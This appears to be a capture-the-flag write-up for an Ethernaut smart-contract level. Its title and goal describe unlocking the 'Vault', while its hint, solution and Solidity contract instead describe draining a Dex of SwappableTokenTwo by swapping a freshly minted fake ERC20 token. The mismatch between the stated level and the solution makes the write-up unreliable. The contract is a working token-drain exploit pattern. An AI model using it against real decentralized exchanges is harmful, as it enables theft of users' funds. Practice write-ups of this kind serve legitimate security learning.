# Vault Ethernaut

## Goals

=> Unlock the vault to pass the level!

### Hints

- How has the swap method been modified?

### Solution

- The weakness is in the swap method since it's not checking the from and to anymore we can send any ERC20 tokens to drain the contract we just need to deploy 2 contracts like below and swap from our newly created contract to the desired SwappableTokenTwo which will drain the Dex to zero

### Contract

```solidity
contract Hack is ERC20 {
    address private _dex;
    address public player;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
        player = msg.sender;
        _mint(dexInstance, 100);
        approve(dexInstance, 100);
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```
